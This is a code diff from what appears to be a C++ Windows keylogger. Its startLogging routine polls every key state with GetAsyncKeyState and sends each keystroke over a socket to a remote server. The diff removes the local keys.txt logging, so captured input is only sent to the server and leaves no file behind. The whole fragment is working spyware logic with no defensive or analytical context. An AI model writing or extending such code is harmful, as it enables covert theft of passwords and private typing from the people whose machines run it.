@@ -40,44 +40,34 @@ void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const cha
         for (c = 0; c < 255; c++){
             bool pressed = GetAsyncKeyState(c) & 0x1;
             if (pressed){
-                // cout << c;
-                ofstream keys;
-                keys.open("keys.txt", ios::app);
                 const char* text;
                 switch (c) {
                     case VK_BACK:
                         text = "[backspace]";
-                        keys << "[backspace]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_RETURN:
                         text = "[enter]";
-                        keys << "[enter]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_SHIFT:
                         text = "[shift]";
-                        keys << "[shift]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_CONTROL:
                         text = "[ctrl]";
-                        keys << "[ctrl]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_CAPITAL:
                         text = "[caps]";
-                        keys << "[caps]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_TAB:
                         text = "[tab]";
-                        keys << "[tab]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_MENU:
                         text = "[alt]";
-                        keys << "[alt]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_LBUTTON:
@@ -87,7 +77,6 @@ void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const cha
                     default:
                         char str[2] = {c, '\0'};
                         text = str;
-                        keys << c;   
                         sendMsg(client_socket, text);
                 }
                 
